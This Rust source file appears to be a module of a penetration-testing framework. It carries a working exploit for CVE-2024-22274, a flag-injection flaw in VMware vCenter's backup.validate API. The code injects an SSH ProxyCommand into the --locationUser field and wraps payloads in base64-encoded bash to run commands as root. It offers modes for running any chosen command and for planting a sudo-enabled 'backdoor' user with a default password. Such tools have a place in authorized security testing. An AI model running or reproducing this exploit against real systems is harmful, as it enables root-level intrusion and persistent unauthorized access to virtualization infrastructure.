// VMware vCenter CVE-2024-22274 - Authenticated RCE via backup.validate flag injection
//
// Affected: VMware vCenter Server 8.0 < 8.0 U2b, 7.0 < 7.0 U3q
// CVSS: 7.2 (High)
//
// The com.vmware.appliance.recovery.backup.validate API is vulnerable to flag injection.
// By injecting malicious SSH flags in the --locationUser parameter, an authenticated
// admin user can execute arbitrary commands as root.
//
// Requirements:
// - SSH access to vCenter appliance shell
// - Credentials with "admin" role
//
// For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use crate::utils::{normalize_target, prompt_default, prompt_int_range};

const DEFAULT_TIMEOUT_SECS: u64 = 30;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   VMware vCenter CVE-2024-22274                                   ║".cyan());
    println!("{}", "║   Authenticated RCE via backup.validate Flag Injection            ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Attack Modes:                                                   ║".cyan());
    println!("{}", "║   1. Check (Safe - touch /tmp/rce_check)                          ║".cyan());
    println!("{}", "║   2. Execute Custom Command                                       ║".cyan());
    println!("{}", "║   3. Add Backdoor User (sudo access)                              ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Create SSH session to vCenter appliance
fn create_vcenter_ssh_session(host: &str, port: u16, username: &str, password: &str) -> Result<(TcpStream, Session)> {
    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(
        &addr.parse().map_err(|_| anyhow!("Invalid address"))?,
        Duration::from_secs(DEFAULT_TIMEOUT_SECS),
    ).map_err(|e| anyhow!("Connection failed: {}", e))?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(DEFAULT_TIMEOUT_SECS)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(DEFAULT_TIMEOUT_SECS)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp.try_clone()?);
    sess.handshake()?;
    
    sess.userauth_password(username, password)?;
    
    if !sess.authenticated() {
        return Err(anyhow!("Authentication failed"));
    }
    
    Ok((tcp, sess))
}

/// Execute command in vCenter appliance shell
fn vcenter_shell_exec(sess: &Session, cmd: &str) -> Result<(i32, String, String)> {
    let mut channel = sess.channel_session()?;
    channel.exec(cmd)?;
    
    let mut stdout = String::new();
    let mut stderr = String::new();
    
    sess.set_blocking(true);
    
    channel.read_to_string(&mut stdout)?;
    channel.stderr().read_to_string(&mut stderr)?;
    
    channel.wait_close()?;
    let exit_code = channel.exit_status()?;
    
    Ok((exit_code, stdout, stderr))
}

/// Build the malicious backup.validate command with flag injection
fn build_exploit_command(payload: &str) -> String {
    // The payload is injected via -o ProxyCommand= in the --locationUser field
    // Format: backup.validate --parts common --locationType SFTP --location nowhere 
    //         --locationUser '-o ProxyCommand=;<PAYLOAD> 2>' --locationPassword x
    
    format!(
        "backup.validate --parts common --locationType SFTP --location nowhere --locationUser '-o ProxyCommand=;{} 2>' --locationPassword x",
        payload
    )
}

/// Generate base64-encoded payload for complex commands
fn encode_payload(cmd: &str) -> String {
    use base64::Engine;
    let encoded = base64::engine::general_purpose::STANDARD.encode(cmd);
    format!("/bin/bash -c \"{{echo,{}}}|{{base64,-d}}|bash\"", encoded)
}

/// Check vulnerability (safe mode - creates /tmp/rce_check file)
pub async fn attack_check(host: &str, port: u16, username: &str, password: &str) -> Result<bool> {
    println!("{}", "[*] Running vulnerability check (safe mode)...".cyan());
    
    let (_, sess) = create_vcenter_ssh_session(host, port, username, password)?;
    println!("{}", format!("[+] Authenticated to {} as {}", host, username).green());
    
    // Simple payload: touch /tmp/rce_check
    let payload = "/bin/touch /tmp/rce_check";
    let exploit_cmd = build_exploit_command(payload);
    
    println!("{}", "[*] Executing exploit command...".cyan());
    println!("{}", format!("[DEBUG] Command: {}", exploit_cmd).dimmed());
    
    let _ = vcenter_shell_exec(&sess, &exploit_cmd);
    
    // Verify file was created
    tokio::time::sleep(Duration::from_secs(2)).await;
    
    let verify_cmd = "ls -la /tmp/rce_check 2>/dev/null || echo 'NOT_FOUND'";
    match vcenter_shell_exec(&sess, verify_cmd) {
        Ok((_, stdout, _)) => {
            if stdout.contains("NOT_FOUND") {
                println!("{}", "[-] Vulnerability check FAILED - file not created".red());
                return Ok(false);
            } else {
                println!("{}", "[+] VULNERABLE! File /tmp/rce_check created as root".green().bold());
                println!("{}", stdout.trim());
                
                // Cleanup
                let _ = vcenter_shell_exec(&sess, "rm -f /tmp/rce_check");
                return Ok(true);
            }
        }
        Err(e) => {
            println!("{}", format!("[-] Verification failed: {}", e).red());
            return Ok(false);
        }
    }
}

/// Execute custom command as root
pub async fn attack_exec(host: &str, port: u16, username: &str, password: &str, command: &str) -> Result<bool> {
    println!("{}", format!("[*] Executing command as root: {}", command).cyan());
    
    let (_, sess) = create_vcenter_ssh_session(host, port, username, password)?;
    println!("{}", format!("[+] Authenticated to {} as {}", host, username).green());
    
    // Encode the command to avoid shell interpretation issues
    let payload = encode_payload(command);
    let exploit_cmd = build_exploit_command(&payload);
    
    println!("{}", "[*] Executing exploit...".cyan());
    
    // Execute the exploit
    let _ = vcenter_shell_exec(&sess, &exploit_cmd);
    
    println!("{}", "[+] Command sent. Note: Output may not be visible due to injection method.".yellow());
    println!("{}", "[*] For commands with output, consider redirecting to a file.".dimmed());
    
    Ok(true)
}

/// Add backdoor user with sudo access
pub async fn attack_add_user(host: &str, port: u16, username: &str, password: &str, 
                              backdoor_user: &str, backdoor_pass: &str) -> Result<bool> {
    println!("{}", format!("[*] Adding backdoor user: {}", backdoor_user).cyan());
    
    let (_, sess) = create_vcenter_ssh_session(host, port, username, password)?;
    println!("{}", format!("[+] Authenticated to {} as {}", host, username).green());
    
    // Command to add user with sudo access
    // useradd USER && echo -e "PASS\nPASS" | passwd USER ; usermod -s /bin/bash USER && usermod -aG sudo USER
    let add_user_cmd = format!(
        "useradd {} && echo -e \"{}\\n{}\" | passwd {} ; usermod -s /bin/bash {} && usermod -aG sudo {}",
        backdoor_user, backdoor_pass, backdoor_pass, backdoor_user, backdoor_user, backdoor_user
    );
    
    let payload = encode_payload(&add_user_cmd);
    let exploit_cmd = build_exploit_command(&payload);
    
    println!("{}", "[*] Executing user creation exploit...".cyan());
    
    let _ = vcenter_shell_exec(&sess, &exploit_cmd);
    
    // Wait and verify
    tokio::time::sleep(Duration::from_secs(2)).await;
    
    let verify_cmd = format!("id {} 2>/dev/null || echo 'NOT_FOUND'", backdoor_user);
    match vcenter_shell_exec(&sess, &verify_cmd) {
        Ok((_, stdout, _)) => {
            if stdout.contains("NOT_FOUND") {
                println!("{}", "[-] User creation may have failed".yellow());
            } else {
                println!("{}", format!("[+] SUCCESS! User {} created", backdoor_user).green().bold());
                println!("{}", stdout.trim());
                println!();
                println!("{}", format!("[*] Connect via: ssh {}@{}", backdoor_user, host).cyan());
                println!("{}", format!("[*] Password: {}", backdoor_pass).cyan());
            }
        }
        Err(_) => {}
    }
    
    Ok(true)
}

/// Prompt helper
async fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target)?;
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get connection parameters
    let port: u16 = prompt_default("SSH Port", "22").await?.parse().unwrap_or(22);
    let username = prompt("vCenter Admin Username").await?;
    if username.is_empty() {
        return Err(anyhow!("Username is required"));
    }
    let password = prompt("Password").await?;
    if password.is_empty() {
        return Err(anyhow!("Password is required"));
    }
    
    println!();
    println!("{}", "Select attack mode:".yellow().bold());
    println!("  1. Check Vulnerability (Safe - touch /tmp/rce_check)");
    println!("  2. Execute Custom Command");
    println!("  3. Add Backdoor User (sudo access)");
    println!();
    
    let mode = prompt_int_range("Attack mode", 1, 1, 3).await?;
    
    match mode {
        1 => {
            attack_check(&host, port, &username, &password).await?;
        }
        2 => {
            let command = prompt("Command to execute as root").await?;
            if command.is_empty() {
                return Err(anyhow!("Command is required"));
            }
            attack_exec(&host, port, &username, &password, &command).await?;
        }
        3 => {
            let backdoor_user = prompt_default("Backdoor username", "backdoor").await?;
            let backdoor_pass = prompt_default("Backdoor password", "Backdoor123!").await?;
            attack_add_user(&host, port, &username, &password, &backdoor_user, &backdoor_pass).await?;
        }
        _ => {
            println!("{}", "[-] Invalid mode".red());
        }
    }
    
    println!();
    println!("{}", "[*] CVE-2024-22274 exploit module complete".green());
    
    Ok(())
}
